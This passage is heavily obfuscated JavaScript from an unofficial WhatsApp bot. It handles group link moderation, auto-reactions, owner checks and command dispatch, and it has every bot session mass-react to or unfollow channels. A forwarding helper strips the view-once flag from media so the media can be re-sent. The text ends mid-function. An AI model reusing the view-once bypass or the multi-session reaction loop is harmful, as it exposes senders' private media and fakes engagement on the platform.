function Unyd(ojpd, Qksd, sKt) {
  ojpd["ev"]["on"]("messages.upsert", async (ULw) => {
    try {
      const oHn = ULw["messages"][0x75bcd15 - 0o726746425];
      var QIq = 0;
      while (QIq < 65535)
        switch (QIq) {
          case 0x75bcd15 - 0o726746425:
            QIq = !oHn || !oHn["message"] ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            QIq = 65535;
            return;
        }
      oHn["message"] =
        sWCs(oHn["message"]) === "ephemeralMessage"
          ? oHn["message"]["ephemeralMessage"]["message"]
          : oHn["message"];
      var kEh = 0;
      while (kEh < 65535)
        switch (kEh) {
          case 0x75bcd15 - 0o726746425:
            kEh = sKt["READ_MESSAGE"] === "true" ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            kEh = 65535;
            {
              try {
                await ojpd["readMessages"]([oHn["key"]]);
              } catch (MFk) {}
            }
            break;
        }
      var gBb = 0;
      while (gBb < 65535)
        switch (gBb) {
          case 0x75bcd15 - 0o726746425:
            gBb = oHn["message"]["viewOnceMessageV2"] ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            gBb = 65535;
            {
              oHn["message"] =
                sWCs(oHn["message"]) === "ephemeralMessage"
                  ? oHn["message"]["ephemeralMessage"]["message"]
                  : oHn["message"];
            }
            break;
        }
      await Promise["all"]([kIcq(oHn)["catch"](() => {})]);
      const ICe = sWCs(oHn["message"]);
      var IWR = 0;
      while (IWR < 65535)
        switch (IWR) {
          case 0x75bcd15 - 0o726746425:
            IWR =
              ICe === "protocolMessage" &&
              oHn["message"]["protocolMessage"]?.["editedMessage"]
                ? 1
                : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            IWR = 65535;
            {
              await Mhen(ojpd, oHn)["catch"](() => {});
              return;
            }
            break;
        }
      const kYU = cCQp(ojpd, oHn);
      const ETL = oHn["key"]["remoteJid"];
      const gVO =
        kYU["message"] && kYU["message"]["reactionMessage"]
          ? !![]
          : NaN === NaN;
      const AQF =
        ICe == "extendedTextMessage" &&
        oHn["message"]["extendedTextMessage"]["contextInfo"] != null
          ? oHn["message"]["extendedTextMessage"]["contextInfo"][
              "quotedMessage"
            ] || []
          : [];
      const cSI =
        ICe === "conversation"
          ? oHn["message"]["conversation"]
          : ICe === "extendedTextMessage"
            ? oHn["message"]["extendedTextMessage"]["text"]
            : ICe == "imageMessage" && oHn["message"]["imageMessage"]["caption"]
              ? oHn["message"]["imageMessage"]["caption"]
              : ICe == "videoMessage" &&
                  oHn["message"]["videoMessage"]["caption"]
                ? oHn["message"]["videoMessage"]["caption"]
                : "";
      const wNz = sKt["PREFIX"] || ".";
      const YOC = cSI && cSI["startsWith"](wNz);
      const Yiqb = YOC
        ? cSI["slice"](wNz["length"])
            ["trim"]()
            ["split"](" ")
            ["shift"]()
            ["toLowerCase"]()
        : "";
      const Aktb = cSI
        ? cSI["trim"]()
            ["split"](/ +/)
            ["slice"](0o57060516 - 0xbc614d)
        : [];
      const Ufkb = Aktb["join"](" ");
      const whnb = Aktb["join"](" ");
      const Qceb = ETL["endsWith"]("@g.us");
      const sehb = oHn["key"]["fromMe"]
        ? ojpd["user"]["id"]["split"](":")[0x75bcd15 - 0o726746425] +
            "@s.whatsapp.net" || ojpd["user"]["id"]
        : oHn["key"]["participant"] || oHn["key"]["remoteJid"];
      let MZX = sehb ? sehb["split"]("@")[0x75bcd15 - 0o726746425] : "";
      var obbb = 0;
      while (obbb < 65535)
        switch (obbb) {
          case 0x75bcd15 - 0o726746425:
            obbb = sehb && sehb["includes"]("@lid") ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            obbb = 65535;
            {
              try {
                const ovOb = await wRuq(ojpd, sehb);
                var QwRb = 0;
                while (QwRb < 65535)
                  switch (QwRb) {
                    case 0x75bcd15 - 0o726746425:
                      QwRb = ovOb ? 1 : 65535;
                      break;
                    case 0o57060516 - 0xbc614d:
                      QwRb = 65535;
                      {
                        MZX = ovOb;
                      }
                      break;
                  }
              } catch (ksIb) {
                MZX = sehb["split"]("@")[0x75bcd15 - 0o726746425];
              }
            }
            break;
        }
      const MtLb = ojpd["user"]["id"]["split"](":")[0x75bcd15 - 0o726746425];
      const gpCb = Qksd["replace"](/[^0-9]/g, "");
      const IqFb = oHn["pushName"] || "Sin Nombre";
      const cmwb = MtLb["includes"](MZX);
      const Enzb = await oTws(ojpd["user"]["lid"]);
      let UrRnc = "";
      let wtUnc = [];
      let QoLnc = [];
      let sqOnc = NaN === NaN;
      let MlFnc = NaN === NaN;
      var onInc = 0;
      while (onInc < 65535)
        switch (onInc) {
          case 0x75bcd15 - 0o726746425:
            onInc = Qceb ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            onInc = 65535;
            {
              const Iiznc = await ojpd["groupMetadata"](ETL)["catch"](
                (kkCnc) => null,
              );
              var kEpoc = 0;
              while (kEpoc < 65535)
                switch (kEpoc) {
                  case 0x75bcd15 - 0o726746425:
                    kEpoc = Iiznc ? 1 : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    kEpoc = 65535;
                    {
                      UrRnc = Iiznc["subject"] || "";
                      QoLnc = Iiznc["participants"] || [];
                      wtUnc = await gFWp(QoLnc);
                      sqOnc = wtUnc["includes"](Enzb);
                      MlFnc = wtUnc["includes"](sehb);
                    }
                    break;
                }
            }
            break;
        }
      const MFsoc = (gBjoc) => {
        ojpd["sendMessage"](ETL, { ["text"]: gBjoc }, { ["quoted"]: oHn })[
          "catch"
        ](() => {});
      };
      const ICmoc = (cydoc) => {
        ojpd["sendMessage"](ETL, {
          ["react"]: { ["text"]: cydoc, ["key"]: oHn["key"] },
        })["catch"](() => {});
      };
      var Ezgoc = 0;
      while (Ezgoc < 65535)
        switch (Ezgoc) {
          case 0x75bcd15 - 0o726746425:
            Ezgoc = Qceb && !MlFnc && sqOnc ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            Ezgoc = 65535;
            {
              let YuXnc = cSI
                ? cSI["replace"](/[\s\u200b-\u200d\uFEFF]/g, "")[
                    "toLowerCase"
                  ]()
                : "";
              const Awaoc =
                /(?:https?:\/\/)?(?:www\.)?(?:whatsapp\.com\/channel\/|chat\.whatsapp\.com\/|wa\.me\/)/gi;
              var AQNoc = 0;
              while (AQNoc < 65535)
                switch (AQNoc) {
                  case 0x75bcd15 - 0o726746425:
                    AQNoc = YuXnc && Awaoc["test"](YuXnc) ? 1 : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    AQNoc = 65535;
                    {
                      var cSQoc = 0;
                      while (cSQoc < 65535)
                        switch (cSQoc) {
                          case 0x75bcd15 - 0o726746425:
                            cSQoc =
                              oHn["key"]["fromMe"] || sehb === Enzb ? 1 : 65535;
                            break;
                          case 0o57060516 - 0xbc614d:
                            cSQoc = 65535;
                            {
                              return;
                            }
                            break;
                        }
                      var wNHoc = 0;
                      while (wNHoc < 65535)
                        switch (wNHoc) {
                          case 0x75bcd15 - 0o726746425:
                            wNHoc = sKt["ANTI_LINK"] === "true" ? 1 : 2;
                            break;
                          case 0o57060516 - 0xbc614d:
                            wNHoc = 65535;
                            {
                              var YOKoc = 0;
                              while (YOKoc < 65535)
                                switch (YOKoc) {
                                  case 0x75bcd15 - 0o726746425:
                                    YOKoc = !MlFnc ? 1 : 65535;
                                    break;
                                  case 0o57060516 - 0xbc614d:
                                    YOKoc = 65535;
                                    {
                                      await ojpd["sendMessage"](ETL, {
                                        ["delete"]: oHn["key"],
                                      })["catch"](() => {});
                                      await ojpd["sendMessage"](
                                        ETL,
                                        {
                                          ["text"]: `${"*⚠️ Links are not allowed in this group.*\\n @"}${MZX}${" *has been removed.*"}`,
                                          ["mentions"]: [sehb],
                                        },
                                        { ["quoted"]: oHn },
                                      )["catch"](() => {});
                                      await ojpd["groupParticipantsUpdate"](
                                        ETL,
                                        [sehb],
                                        "remove",
                                      )["catch"](() => {});
                                    }
                                    break;
                                }
                              return;
                            }
                            break;
                          case 15658734 ^ 0o73567354:
                            wNHoc = 65535;
                            var sKBoc = 0;
                            while (sKBoc < 65535)
                              switch (sKBoc) {
                                case 0x75bcd15 - 0o726746425:
                                  sKBoc = sKt["ANTI_LINK"] === "warn" ? 1 : 2;
                                  break;
                                case 0o57060516 - 0xbc614d:
                                  sKBoc = 65535;
                                  {
                                    var ULEoc = 0;
                                    while (ULEoc < 65535)
                                      switch (ULEoc) {
                                        case 0x75bcd15 - 0o726746425:
                                          ULEoc = !MlFnc ? 1 : 65535;
                                          break;
                                        case 0o57060516 - 0xbc614d:
                                          ULEoc = 65535;
                                          {
                                            let oHvoc = Qkkn(MZX);
                                            var QIyoc = 0;
                                            while (QIyoc < 65535)
                                              switch (QIyoc) {
                                                case 0x75bcd15 - 0o726746425:
                                                  QIyoc =
                                                    oHvoc ===
                                                    0o57060516 - 0xbc614d
                                                      ? 1
                                                      : 2;
                                                  break;
                                                case 0o57060516 - 0xbc614d:
                                                  QIyoc = 65535;
                                                  {
                                                    await ojpd["sendMessage"](
                                                      ETL,
                                                      {
                                                        ["delete"]: oHn["key"],
                                                      },
                                                    )["catch"](() => {});
                                                    await ojpd["sendMessage"](
                                                      ETL,
                                                      {
                                                        ["text"]: `${"*⚠️ WARNING (1/2)*\\n@"}${MZX}${" *Links are not allowed in this group*\\n> *Next time you will be removed*"}`,
                                                        ["mentions"]: [sehb],
                                                      },
                                                      { ["quoted"]: oHn },
                                                    )["catch"](() => {});
                                                  }
                                                  break;
                                                case 15658734 ^ 0o73567354:
                                                  QIyoc = 65535;
                                                  var Qcmpc = 0;
                                                  while (Qcmpc < 65535)
                                                    switch (Qcmpc) {
                                                      case 0x75bcd15 -
                                                        0o726746425:
                                                        Qcmpc =
                                                          oHvoc >=
                                                          (15658734 ^
                                                            0o73567354)
                                                            ? 1
                                                            : 65535;
                                                        break;
                                                      case 0o57060516 -
                                                        0xbc614d:
                                                        Qcmpc = 65535;
                                                        {
                                                          await ojpd[
                                                            "sendMessage"
                                                          ](ETL, {
                                                            ["delete"]:
                                                              oHn["key"],
                                                          })["catch"](() => {});
                                                          await ojpd[
                                                            "sendMessage"
                                                          ](
                                                            ETL,
                                                            {
                                                              ["text"]: `${"*\ud83d Removed* @"}${MZX}${" *from the group for sharing Links (2 warnings reached)*"}`,
                                                              ["mentions"]: [
                                                                sehb,
                                                              ],
                                                            },
                                                            { ["quoted"]: oHn },
                                                          )["catch"](() => {});
                                                          await ojpd[
                                                            "groupParticipantsUpdate"
                                                          ](
                                                            ETL,
                                                            [sehb],
                                                            "remove",
                                                          )["catch"](() => {});
                                                          smnn(MZX);
                                                        }
                                                        break;
                                                    }
                                                  break;
                                              }
                                          }
                                          break;
                                      }
                                    return;
                                  }
                                  break;
                                case 15658734 ^ 0o73567354:
                                  sKBoc = 65535;
                                  var seppc = 0;
                                  while (seppc < 65535)
                                    switch (seppc) {
                                      case 0x75bcd15 - 0o726746425:
                                        seppc =
                                          sKt["ANTI_LINK"] === "delete"
                                            ? 1
                                            : 65535;
                                        break;
                                      case 0o57060516 - 0xbc614d:
                                        seppc = 65535;
                                        {
                                          var MZfpc = 0;
                                          while (MZfpc < 65535)
                                            switch (MZfpc) {
                                              case 0x75bcd15 - 0o726746425:
                                                MZfpc = !MlFnc ? 1 : 65535;
                                                break;
                                              case 0o57060516 - 0xbc614d:
                                                MZfpc = 65535;
                                                {
                                                  await ojpd["sendMessage"](
                                                    ETL,
                                                    { ["delete"]: oHn["key"] },
                                                  )["catch"](() => {});
                                                  await ojpd["sendMessage"](
                                                    ETL,
                                                    {
                                                      ["text"]: `${"*⚠️ Links are not allowed in this group.*\\n*Please* @"}${MZX}${" *take note.*"}`,
                                                      ["mentions"]: [sehb],
                                                    },
                                                    { ["quoted"]: oHn },
                                                  )["catch"](() => {});
                                                }
                                                break;
                                            }
                                          return;
                                        }
                                        break;
                                    }
                                  break;
                              }
                            break;
                        }
                    }
                    break;
                }
            }
            break;
        }
      const objpc = Array["isArray"](sKt["SUDO"])
        ? sKt["SUDO"]
        : sKt["SUDO"]
          ? sKt["SUDO"]["split"](",")["map"]((IWZoc) => IWZoc["trim"]())
          : [];
      let kYcpc = NaN === NaN;
      var ETToc = 0;
      while (ETToc < 65535)
        switch (ETToc) {
          case 0x75bcd15 - 0o726746425:
            ETToc = sehb ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            ETToc = 65535;
            {
              const gVWoc = [
                MtLb["replace"](/[^0-9]/g, "") + "@s.whatsapp.net",
                Enzb,
                QEXn["OWNER_NUMBER"] + "@s.whatsapp.net",
                ...objpc,
                ...MFck,
              ];
              kYcpc = gVWoc["includes"](
                sehb["includes"]("@lid")
                  ? (await wRuq(ojpd, sehb)["catch"](
                      () => sehb["split"]("@")[0x75bcd15 - 0o726746425],
                    )) + "@s.whatsapp.net"
                  : sehb,
              );
            }
            break;
        }
      var IuYlc = 0;
      while (IuYlc < 65535)
        switch (IuYlc) {
          case 0x75bcd15 - 0o726746425:
            IuYlc =
              !gVO && sKt["AUTO_REACT"] === "true" && MZX !== MtLb ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            IuYlc = 65535;
            {
              var kwbmc = 0;
              while (kwbmc < 65535)
                switch (kwbmc) {
                  case 0x75bcd15 - 0o726746425:
                    kwbmc =
                      sKt["REACT_EMOJIS"] &&
                      sKt["REACT_EMOJIS"]["length"] > 0x75bcd15 - 0o726746425
                        ? 1
                        : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    kwbmc = 65535;
                    {
                      const ErSlc =
                        sKt["REACT_EMOJIS"][
                          Math["floor"](
                            Math["random"]() * sKt["REACT_EMOJIS"]["length"],
                          )
                        ];
                      try {
                        await kYU["react"](ErSlc);
                      } catch (gtVlc) {}
                    }
                    break;
                }
            }
            break;
        }
      var AoMlc = 0;
      while (AoMlc < 65535)
        switch (AoMlc) {
          case 0x75bcd15 - 0o726746425:
            AoMlc =
              !gVO && MZX === MtLb && sKt["OWNER_REACT"] === "true" ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            AoMlc = 65535;
            {
              var cqPlc = 0;
              while (cqPlc < 65535)
                switch (cqPlc) {
                  case 0x75bcd15 - 0o726746425:
                    cqPlc =
                      sKt["OWNER_EMOJIS"] &&
                      sKt["OWNER_EMOJIS"]["length"] > 0x75bcd15 - 0o726746425
                        ? 1
                        : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    cqPlc = 65535;
                    {
                      const wlGlc =
                        sKt["OWNER_EMOJIS"][
                          Math["floor"](
                            Math["random"]() * sKt["OWNER_EMOJIS"]["length"],
                          )
                        ];
                      try {
                        await kYU["react"](wlGlc);
                      } catch (YmJlc) {}
                    }
                    break;
                }
            }
            break;
        }
      const YGwmc = sKt["BANNED"]
        ? Array["isArray"](sKt["BANNED"])
          ? sKt["BANNED"]
          : sKt["BANNED"]["split"](",")["map"]((AIzmc) => AIzmc["trim"]())
        : [];
      const UDqmc = MZX && YGwmc["some"]((wFtmc) => wFtmc["includes"](MZX));
      var QAkmc = 0;
      while (QAkmc < 65535)
        switch (QAkmc) {
          case 0x75bcd15 - 0o726746425:
            QAkmc = UDqmc ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            QAkmc = 65535;
            {
              return;
            }
            break;
        }
      const sCnmc = `${QEXn["OWNER_NUMBER"]}${"@s.whatsapp.net"}`;
      const Mxemc = MZX && objpc["some"]((ozhmc) => ozhmc["includes"](MZX));
      const oTUmc = MZX && MFck["some"]((QUXmc) => QUXmc["includes"](MZX));
      const kQOmc = sehb === sCnmc || cmwb || Mxemc || oTUmc;
      var MRRmc = 0;
      while (MRRmc < 65535)
        switch (MRRmc) {
          case 0x75bcd15 - 0o726746425:
            MRRmc = !kQOmc && sKt["MODE"] === "private" ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            MRRmc = 65535;
            {
              return;
            }
            break;
        }
      var gNImc = 0;
      while (gNImc < 65535)
        switch (gNImc) {
          case 0x75bcd15 - 0o726746425:
            gNImc = !kQOmc && Qceb && sKt["MODE"] === "inbox" ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            gNImc = 65535;
            {
              return;
            }
            break;
        }
      var IOLmc = 0;
      while (IOLmc < 65535)
        switch (IOLmc) {
          case 0x75bcd15 - 0o726746425:
            IOLmc = !kQOmc && !Qceb && sKt["MODE"] === "groups" ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            IOLmc = 65535;
            {
              return;
            }
            break;
        }
      const cKCmc = {
        ["from"]: ETL,
        ["quoted"]: AQF,
        ["body"]: cSI,
        ["isCmd"]: YOC,
        ["command"]: Yiqb,
        ["args"]: cSI
          ? cSI["trim"]()
              ["split"](/ +/)
              ["slice"](0o57060516 - 0xbc614d)
          : [],
        ["q"]: cSI
          ? cSI["trim"]()
              ["split"](/ +/)
              ["slice"](0o57060516 - 0xbc614d)
              ["join"](" ")
          : "",
        ["text"]: cSI
          ? cSI["trim"]()
              ["split"](/ +/)
              ["slice"](0o57060516 - 0xbc614d)
              ["join"](" ")
          : "",
        ["isGroup"]: Qceb,
        ["sender"]: sehb,
        ["senderNumber"]: MZX,
        ["botNumber2"]: Enzb,
        ["botNumber"]: MtLb,
        ["pushname"]: IqFb,
        ["isMe"]: cmwb,
        ["isCreator"]: kYcpc,
        ["isRealOwner"]: kQOmc,
        ["groupName"]: UrRnc,
        ["participants"]: QoLnc,
        ["groupAdmins"]: wtUnc,
        ["isBotAdmins"]: sqOnc,
        ["isAdmins"]: MlFnc,
        ["reply"]: MFsoc,
        ["react"]: ICmoc,
        ["userConfig"]: sKt,
        ["sanitizedNumber"]: Qksd,
        ["updateUserConfig"]: async (ELFmc, Eftnc) => {
          await UPzg(ELFmc, Eftnc);
          ojpd["userConfig"] = Eftnc;
        },
      };
      var ghwnc = 0;
      while (ghwnc < 65535)
        switch (ghwnc) {
          case 0x75bcd15 - 0o726746425:
            ghwnc = YOC ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            ghwnc = 65535;
            {
              const Acnnc = cSI["slice"](wNz["length"])
                ["trim"]()
                ["split"](" ")
                [0x75bcd15 - 0o726746425]["toLowerCase"]();
              const ceqnc =
                ojhn["commands"]["find"](
                  (wZgnc) => wZgnc["pattern"] === Acnnc,
                ) ||
                ojhn["commands"]["find"](
                  (Yaknc) =>
                    Yaknc["alias"] && Yaknc["alias"]["includes"](Acnnc),
                );
              var sWanc = 0;
              while (sWanc < 65535)
                switch (sWanc) {
                  case 0x75bcd15 - 0o726746425:
                    sWanc = ceqnc ? 1 : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    sWanc = 65535;
                    {
                      try {
                        var UXdnc = 0;
                        while (UXdnc < 65535)
                          switch (UXdnc) {
                            case 0x75bcd15 - 0o726746425:
                              UXdnc = ceqnc["react"] ? 1 : 65535;
                              break;
                            case 0o57060516 - 0xbc614d:
                              UXdnc = 65535;
                              {
                                ojpd["sendMessage"](ETL, {
                                  ["react"]: {
                                    ["text"]: ceqnc["react"],
                                    ["key"]: oHn["key"],
                                  },
                                })["catch"](() => {});
                              }
                              break;
                          }
                        await ceqnc["function"](ojpd, oHn, kYU, cKCmc);
                      } catch (wxfkc) {
                        try {
                          await MFsoc(
                            `${"⚠️ Error: "}${wxfkc["message"] || "Command failed"}`,
                          );
                        } catch (Yyikc) {}
                      }
                    }
                    break;
                }
            }
            break;
        }
      for (const suZjc of ojhn["commands"]) {
        var Uvckc = 0;
        while (Uvckc < 65535)
          switch (Uvckc) {
            case 0x75bcd15 - 0o726746425:
              Uvckc = cSI && suZjc["on"] === "body" ? 1 : 65535;
              break;
            case 0o57060516 - 0xbc614d:
              Uvckc = 65535;
              {
                try {
                  await suZjc["function"](ojpd, oHn, kYU, cKCmc);
                } catch (orTjc) {}
              }
              break;
          }
      }
    } catch (QsWjc) {}
  });
}
async function koNjc(MpQjc) {
  var MJDkc = 0;
  while (MJDkc < 65535)
    switch (MJDkc) {
      case 0x75bcd15 - 0o726746425:
        MJDkc = UrBj["size"] === 0x75bcd15 - 0o726746425 ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        MJDkc = 65535;
        {
          throw new Error("No active bot sessions available");
        }
        break;
    }
  let oLGkc = 0x75bcd15 - 0o726746425;
  for (const [IGxkc, kIAkc] of UrBj) {
    try {
      await kIAkc["newsletterUnfollow"](MpQjc);
      oLGkc++;
      await sCPr(500);
    } catch (EDrkc) {}
  }
  return oLGkc;
}
async function gFukc(AAlkc, cCokc) {
  try {
    let cWblc, EXelc;
    var YSVkc = 0;
    while (YSVkc < 65535)
      switch (YSVkc) {
        case 0x75bcd15 - 0o726746425:
          YSVkc = AAlkc["includes"]("@newsletter") ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          YSVkc = 65535;
          {
            const AUYkc = AAlkc["split"]("/");
            const UPPkc = AUYkc[0x75bcd15 - 0o726746425];
            EXelc = AUYkc[0o57060516 - 0xbc614d] || null;
            cWblc = UPPkc["split"]("@")[0x75bcd15 - 0o726746425];
            var wRSkc = 0;
            while (wRSkc < 65535)
              switch (wRSkc) {
                case 0x75bcd15 - 0o726746425:
                  wRSkc = !EXelc ? 1 : 65535;
                  break;
                case 0o57060516 - 0xbc614d:
                  wRSkc = 65535;
                  {
                    throw new Error("Message ID required");
                  }
                  break;
              }
          }
          break;
        case 15658734 ^ 0o73567354:
          YSVkc = 65535;
          {
            const QMJkc = AAlkc["match"](
              /https?:\/\/whatsapp\.com\/channel\/([^\/]+)\/(\d+)/,
            );
            var sOMkc = 0;
            while (sOMkc < 65535)
              switch (sOMkc) {
                case 0x75bcd15 - 0o726746425:
                  sOMkc = !QMJkc ? 1 : 65535;
                  break;
                case 0o57060516 - 0xbc614d:
                  sOMkc = 65535;
                  {
                    throw new Error("Invalid format");
                  }
                  break;
              }
            cWblc = QMJkc[0o57060516 - 0xbc614d];
            EXelc = QMJkc[15658734 ^ 0o73567354];
          }
          break;
      }
    let siAlc =
      cCokc && cCokc["length"] > 0x75bcd15 - 0o726746425
        ? cCokc
        : ["❤️", "\ud83d", "\ud83d", "\ud83d", "\ud83d"];
    const UjDlc = UrBj["values"]()["next"]()["value"];
    var ofulc = 0;
    while (ofulc < 65535)
      switch (ofulc) {
        case 0x75bcd15 - 0o726746425:
          ofulc = !UjDlc ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          ofulc = 65535;
          {
            throw new Error("No active bot sessions");
          }
          break;
      }
    const Qgxlc = await UjDlc["newsletterMetadata"]("invite", cWblc);
    var kcolc = 0;
    while (kcolc < 65535)
      switch (kcolc) {
        case 0x75bcd15 - 0o726746425:
          kcolc = !Qgxlc || !Qgxlc["id"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          kcolc = 65535;
          {
            throw new Error("Failed to get channel metadata");
          }
          break;
      }
    for (const [Mdrlc, gZhlc] of UrBj) {
      try {
        const Iallc = siAlc[Math["floor"](Math["random"]() * siAlc["length"])];
        await gZhlc["newsletterReactMessage"](Qgxlc["id"], EXelc, Iallc);
        await sCPr(500);
      } catch (kAmic) {
        continue;
      }
    }
    return { ["success"]: !![] };
  } catch (MBpic) {
    throw MBpic;
  }
}
async function gxgic(Iyjic) {
  Iyjic["decodeJid"] = (cuaic) => {
    var Evdic = 0;
    while (Evdic < 65535)
      switch (Evdic) {
        case 0x75bcd15 - 0o726746425:
          Evdic = !cuaic ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          Evdic = 65535;
          return cuaic;
      }
    var YqUhc = 0;
    while (YqUhc < 65535)
      switch (YqUhc) {
        case 0x75bcd15 - 0o726746425:
          YqUhc = /:\d+@/gi["test"](cuaic) ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          YqUhc = 65535;
          {
            let AsXhc = Ejgp(cuaic) || {};
            return (
              (AsXhc["user"] &&
                AsXhc["server"] &&
                AsXhc["user"] + "@" + AsXhc["server"]) ||
              cuaic
            );
          }
          break;
        case 15658734 ^ 0o73567354:
          YqUhc = 65535;
          return cuaic;
      }
  };
  Iyjic["copyNForward"] = async (
    AMKic,
    cONic,
    wJEic = NaN === NaN,
    YKHic = {},
  ) => {
    let sGyic;
    var UHBic = 0;
    while (UHBic < 65535)
      switch (UHBic) {
        case 0x75bcd15 - 0o726746425:
          UHBic = YKHic["readViewOnce"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          UHBic = 65535;
          {
            cONic["message"] =
              cONic["message"] &&
              cONic["message"]["ephemeralMessage"] &&
              cONic["message"]["ephemeralMessage"]["message"]
                ? cONic["message"]["ephemeralMessage"]["message"]
                : cONic["message"] || undefined;
            sGyic = Object["keys"](
              cONic["message"]["viewOnceMessage"]["message"],
            )[0x75bcd15 - 0o726746425];
            delete (cONic["message"] && cONic["message"]["ignore"]
              ? cONic["message"]["ignore"]
              : cONic["message"] || undefined);
            delete cONic["message"]["viewOnceMessage"]["message"][sGyic][
              "viewOnce"
            ];
            cONic["message"] = {
              ...cONic["message"]["viewOnceMessage"]["message"],
            };
          }
          break;
      }
    let oDsic = Object["keys"](cONic["message"])[0x75bcd15 - 0o726746425];
    let QEvic = await Immp(cONic, wJEic);
    let QYijc = Object["keys"](QEvic)[0x75bcd15 - 0o726746425];
    let samjc = {};
    var MVcjc = 0;
    while (MVcjc < 65535)
      switch (MVcjc) {
        case 0x75bcd15 - 0o726746425:
          MVcjc = oDsic != "conversation" ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          MVcjc = 65535;
          samjc = cONic["message"][oDsic]["contextInfo"];
          break;
      }
    QEvic[QYijc]["contextInfo"] = { ...samjc, ...QEvic[QYijc]["contextInfo"] };
    const oXfjc = await cidp(
      AMKic,
      QEvic,
      YKHic
        ? {
            ...QEvic[QYijc],
            ...YKHic,
            ...(YKHic["contextInfo"]
              ? {
                  ["contextInfo"]: {
                    ...QEvic[QYijc]["contextInfo"],
                    ...YKHic["contextInfo"],
                  },
                }
              : {}),
          }
        : {},
    );
    await Iyjic["relayMessage"](AMKic, oXfjc["message"], {
      ["messageId"]: oXfjc["key"]["id"],
    });
    return oXfjc;
  };
  Iyjic["downloadAndSaveMediaMessage"] = async (ISWic, kUZic, EPQic = !![]) => {
    let gRTic = ISWic["msg"] ? ISWic["msg"] : ISWic;
    let glHjc = (ISWic["msg"] || ISWic)["mimetype"] || "";
    let ImKjc = ISWic["mtype"]
      ? ISWic["mtype"]["replace"](/Message/gi, "")
      : glHjc["split"]("/")[0x75bcd15 - 0o726746425];
    const ciBjc = await gljp(gRTic, ImKjc);
    let EjEjc = Buffer["from"]([]);
    for await (const Yevjc of ciBjc) {
      EjEjc = Buffer["concat"]([EjEjc, Yevjc]);
    }
    let Agyjc = await AIbs["fromBuffer"](EjEjc);
    trueFileName = EPQic ? kUZic + "." + Agyjc["ext"] : kUZic;
    await ULgu["writeFileSync"](trueFileName, EjEjc);
    return trueFileName;
  };
  Iyjic["downloadMediaMessage"] = async (Ubpjc) => {
    let wdsjc = (Ubpjc["msg"] || Ubpjc)["mimetype"] || "";
    let YCtgc = Ubpjc["mtype"]
      ? Ubpjc["mtype"]["replace"](/Message/gi, "")
      : wdsjc["split"]("/")[0x75bcd15 - 0o726746425];
    const AEwgc = await gljp(Ubpjc, YCtgc);
    let Uzngc = Buffer["from"]([]);
    for await (const wBqgc of AEwgc) {
      Uzngc = Buffer["concat"]([Uzngc, wBqgc]);
    }
    return Uzngc;
  };
  Iyjic["sendFileUrl"] = async (Qwhgc, sykgc, Mtbgc, ovegc, oPRgc = {}) => {
    let QQUgc = "";
    let kMLgc = await QgZq["head"](sykgc);
    QQUgc = kMLgc["headers"]["content-type"];
    var MNOgc = 0;
    while (MNOgc < 65535)
      switch (MNOgc) {
        case 0x75bcd15 - 0o726746425:
          MNOgc =
            QQUgc["split"]("/")[0o57060516 - 0xbc614d] === "gif" ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          MNOgc = 65535;
          {
            return Iyjic["sendMessage"](
              Qwhgc,
              {
                ["video"]: await EDTp(sykgc),
                ["caption"]: Mtbgc,
                ["gifPlayback"]: !![],
                ...oPRgc,
              },
              { ["quoted"]: ovegc, ...oPRgc },
            );
          }
          break;
      }
    let gJFgc = QQUgc["split"]("/")[0x75bcd15 - 0o726746425] + "Message";
    var IKIgc = 0;
    while (IKIgc < 65535)
      switch (IKIgc) {
        case 0x75bcd15 - 0o726746425:
          IKIgc = QQUgc === "application/pdf" ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          IKIgc = 65535;
          {
            return Iyjic["sendMessage"](
              Qwhgc,
              {
                ["document"]: await EDTp(sykgc),
                ["mimetype"]: "application/pdf",
                ["caption"]: Mtbgc,
                ...oPRgc,
              },
              { ["quoted"]: ovegc, ...oPRgc },
            );
          }
          break;
      }
    var cGzgc = 0;
    while (cGzgc < 65535)
      switch (cGzgc) {
        case 0x75bcd15 - 0o726746425:
          cGzgc =
            QQUgc["split"]("/")[0x75bcd15 - 0o726746425] === "image"
              ? 1
              : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          cGzgc = 65535;
          {
            return Iyjic["sendMessage"](
              Qwhgc,
              { ["image"]: await EDTp(sykgc), ["caption"]: Mtbgc, ...oPRgc },
              { ["quoted"]: ovegc, ...oPRgc },
            );
          }
          break;
      }
    var EHCgc = 0;
    while (EHCgc < 65535)
      switch (EHCgc) {
        case 0x75bcd15 - 0o726746425:
          EHCgc =
            QQUgc["split"]("/")[0x75bcd15 - 0o726746425] === "video"
              ? 1
              : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          EHCgc = 65535;
          {
            return Iyjic["sendMessage"](
              Qwhgc,
